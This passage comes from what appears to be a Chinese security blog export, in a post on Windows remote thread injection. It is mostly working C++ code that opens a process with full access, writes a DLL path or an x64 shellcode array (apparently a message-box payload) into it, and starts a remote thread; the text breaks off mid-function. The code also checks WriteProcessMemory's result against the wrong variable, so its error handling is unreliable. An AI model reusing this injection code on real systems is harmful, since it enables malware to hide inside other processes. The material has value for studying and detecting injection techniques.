缺点</h2><ul>\n<li>系统为了防止内存访问违规，在被注入进程指定Hook函数的时候，会对注入DLL的锁计数器加1，因为如果不这么做，则被注入进程在执行Hook函数的时候，系统的另一个进程可能会调用UnhookWindowsHookEx，从而引起内存访问违规。这导致我们不能在调用了Hook函数，且函数还在运行时把挂钩清除，在Hook函数执行的整个生命周期，这个挂钩必须一直有效。</li>\n</ul>\n<h1 id=\"0x5-参考链接\"><a href=\"#0x5-参考链接\" class=\"headerlink\" title=\"0x5 参考链接\"></a>0x5 参考链接</h1><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows","readteam"]},{"title":"Windows进程注入方法-远程线程注入","url":"/RemoteThreadInjection/","content":"<h1 id=\"远程线程注入\"><a href=\"#远程线程注入\" class=\"headerlink\" title=\"远程线程注入\"></a>远程线程注入</h1><h2 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h2><p>该注入手法的核心在于几个修改目标进程内存的API：</p>\n<span id=\"more\"></span>\n\n<ul>\n<li>OpenProcess</li>\n<li>VirtualAllocEx</li>\n<li>WriteProcessMemory</li>\n<li>CreateRemoteThread</li>\n</ul>\n<h3 id=\"1-OpenProcess\"><a href=\"#1-OpenProcess\" class=\"headerlink\" title=\"1. OpenProcess\"></a>1. OpenProcess</h3><p>打开指定PID的进程，获取进程句柄。首先要保证该API执行成功，需要不低于目标进程的权限。</p>\n<h3 id=\"2-VirtualAllocEx\"><a href=\"#2-VirtualAllocEx\" class=\"headerlink\" title=\"2. VirtualAllocEx\"></a>2. VirtualAllocEx</h3><p>在目标进程内存空间中申请一段空间。</p>\n<p>该函数的第三个参数为申请内存空间的size，Windows系统内存是按Page为单位的，即0x1000（4k），所以size不足0x1000也会按照1页大小来申请内存空间。</p>\n<p>该函数第五个参数为内存的保护属性，如果是注入dll，就用PAGE_READWRITE（可读可写）；如果注入的是shellcode，要加上可执行（<code>PAGE_EXECUTE_READWRITE</code>）。</p>\n<h3 id=\"3-WriteProcessMemory\"><a href=\"#3-WriteProcessMemory\" class=\"headerlink\" title=\"3. WriteProcessMemory\"></a>3. WriteProcessMemory</h3><p>向目标进程内存空间写入数据。</p>\n<h3 id=\"4-CreateRemoteThread\"><a href=\"#4-CreateRemoteThread\" class=\"headerlink\" title=\"4. CreateRemoteThread\"></a>4. CreateRemoteThread</h3><p>在目标进程中创建一个线程。</p>\n<h2 id=\"0x2-Dll注入\"><a href=\"#0x2-Dll注入\" class=\"headerlink\" title=\"0x2 Dll注入\"></a>0x2 Dll注入</h2><h3 id=\"1-说明\"><a href=\"#1-说明\" class=\"headerlink\" title=\"1. 说明\"></a>1. 说明</h3><p>步骤：</p>\n<ol>\n<li><code>OpenProcess</code>打开目标进程</li>\n<li><code>VirtualAllocEx</code>在目标内存空间申请一段内存</li>\n<li><code>WriteProcessMemory</code>将写好的dll路径写入到目标进程内存中去</li>\n<li>获取<code>kernel32.dll</code>的模块基址，再获取到<code>Loadlibrary</code>函数地址</li>\n<li><code>CreateRemoteThread</code>启动远程线程，线程地址为<code>LoadLibrary</code>函数地址，参数为dll路径字符串地址</li>\n</ol>\n<h3 id=\"2-提示\"><a href=\"#2-提示\" class=\"headerlink\" title=\"2. 提示\"></a>2. 提示</h3><ol>\n<li>在<code>WIndows</code>系统的机器上，<code>kernel32.dll</code>模块基址在同一机器上不同进程内存中是一样的。</li>\n<li><code>CreateRemoteThread</code>的参数中，线程函数的类型为<code>DWORD WINAPI ThreadFunc( LPVOID lpParam ) </code>，而<code>LoadLibrary</code>的函数类型为<code>HMODULE LoadLibrary(LPCTSTR lpFileName)</code>，可以把<code>LoadLibrary</code>当作线程函数，将dll路径字符串当作参数，这样就相当于在目标进程执行<code>LoadLibrary</code>函数来加载指定dll。</li>\n</ol>\n<h2 id=\"0x3-Shellcode注入\"><a href=\"#0x3-Shellcode注入\" class=\"headerlink\" title=\"0x3 Shellcode注入\"></a>0x3 Shellcode注入</h2><p>和Ddll注入不同，shellcode不需要落地的Dll的文件，直接将二进制代码写入目标内存空间并执行</p>\n<h3 id=\"1-说明-1\"><a href=\"#1-说明-1\" class=\"headerlink\" title=\"1. 说明\"></a>1. 说明</h3><p>步骤：</p>\n<ol>\n<li><code>OpenProcess</code>打开目标进程</li>\n<li><code>VirtualAllocEx</code>在目标内存空间申请一段内存，这里保护属性要设置为可读可写可执行（<code>PAGE_EXECUTE_READWRITE</code>）</li>\n<li><code>WriteProcessMemory</code>将写好的shellcode写入到目标进程内存中去</li>\n<li><code>CreateRemoteThread</code>启动远程线程，线程地址为申请的内存空间地址</li>\n</ol>\n<h2 id=\"0x4-代码\"><a href=\"#0x4-代码\" class=\"headerlink\" title=\"0x4 代码\"></a>0x4 代码</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InjectDll</span><span class=\"params\">(DWORD dwPId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\InjectionDll.dll&quot;</span>;</span><br><span class=\"line\">\tHANDLE hProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID lpRemoteDllBuff = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tBOOL bRet = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> nNumberOfBytesWritten;</span><br><span class=\"line\"></span><br><span class=\"line\">\thProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPId);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hProcess) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] OpenProcess faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] OpenProcess success, pid:%d\\r\\n&quot;</span>, dwPId);</span><br><span class=\"line\"></span><br><span class=\"line\">\tlpRemoteDllBuff = <span class=\"built_in\">VirtualAllocEx</span>(</span><br><span class=\"line\">\t\thProcess, </span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">0x1000</span>, </span><br><span class=\"line\">\t\tMEM_RESERVE | MEM_COMMIT, </span><br><span class=\"line\">\t\tPAGE_READWRITE</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteDllBuff)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] VirtualAllocEx faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] VirtualAllocEx success, lpRemoteDllBuff: %p\\r\\n&quot;</span>, lpRemoteDllBuff);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbRet = <span class=\"built_in\">WriteProcessMemory</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\tlpRemoteDllBuff,</span><br><span class=\"line\">\t\tszDllPath,</span><br><span class=\"line\">\t\t<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(szDllPath),</span><br><span class=\"line\">\t\t&amp;nNumberOfBytesWritten</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteDllBuff)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] WriteProcessMemory faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] WriteProcessMemory success, nNumberOfBytesWritten: %zd\\r\\n&quot;</span>, nNumberOfBytesWritten);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHMODULE hMod = <span class=\"built_in\">GetModuleHandle</span>(<span class=\"string\">&quot;kernel32.dll&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] kernel32.dll module base address: %p\\r\\n&quot;</span>, hMod);</span><br><span class=\"line\"></span><br><span class=\"line\">\tFARPROC pfnLoadLibrary = <span class=\"built_in\">GetProcAddress</span>(hMod, <span class=\"string\">&quot;LoadLibraryA&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] LoadLibraryA address: %p\\r\\n&quot;</span>, pfnLoadLibrary);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hThread = <span class=\"built_in\">CreateRemoteThread</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t(LPTHREAD_START_ROUTINE)pfnLoadLibrary, </span><br><span class=\"line\">\t\tlpRemoteDllBuff, </span><br><span class=\"line\">\t\t<span class=\"number\">0</span>, </span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hThread)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] CreateRemoteThread faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] CreateRemoteThread success\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InjectShellcode</span><span class=\"params\">(DWORD dwPId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> hexData[<span class=\"number\">404</span>] = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0xE9</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x58</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x89</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x4C</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8B</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xC9</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x0F</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x09</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xD1</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xCF</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xFB</span>, <span class=\"number\">0x61</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x84</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xDB</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xDB</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xD1</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x39</span>, <span class=\"number\">0x5A</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x18</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xD9</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xF6</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x40</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x0F</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xFD</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xFF</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0xF8</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x74</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x4D</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x3B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x5C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8B</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x28</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x5F</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x41</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x41</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8B</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x81</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0xCC</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x40</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x73</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x65</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xEA</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xFC</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD4</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD8</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x53</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE4</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x69</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x6F</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xC7</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x45</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0xFF</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xD0</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x9E</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x8D</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x45</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x50</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x5D</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID lpRemoteShellcodeAddr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tBOOL bRet = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> nNumberOfBytesWritten;</span><br><span class=\"line\"></span><br><span class=\"line\">\thProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPId);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] OpenProcess faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] OpenProcess success, pid:%d\\r\\n&quot;</span>, dwPId);</span><br><span class=\"line\"></span><br><span class=\"line\">\tlpRemoteShellcodeAddr = <span class=\"built_in\">VirtualAllocEx</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x1000</span>,</span><br><span class=\"line\">\t\tMEM_RESERVE | MEM_COMMIT,</span><br><span class=\"line\">\t\tPAGE_EXECUTE_READWRITE</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteShellcodeAddr)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] VirtualAllocEx faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] VirtualAllocEx success, lpRemoteDllBuff: %p\\r\\n&quot;</span>, lpRemoteShellcodeAddr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbRet = <span class=\"built_in\">WriteProcessMemory</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\tlpRemoteShellcodeAddr,</span><br><span class=\"line\">\t\thexData,</span><br><span class=\"line\">\t\t<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(hexData),</span><br><span class=\"line\">\t\t&amp;nNumberOfBytesWritten</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteShellcodeAddr)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] WriteProcessMemory faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] WriteProcessMemory success, nNumberOfBytesWritten: %zd\\r\\n&quot;</span>, nNumberOfBytesWritten);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hThread = <span class=\"built_in\">CreateRemoteThread</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t(LPTHREAD_START_ROUTINE)lpRemoteShellcodeAddr,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hThread)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] CreateRemoteThread faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span 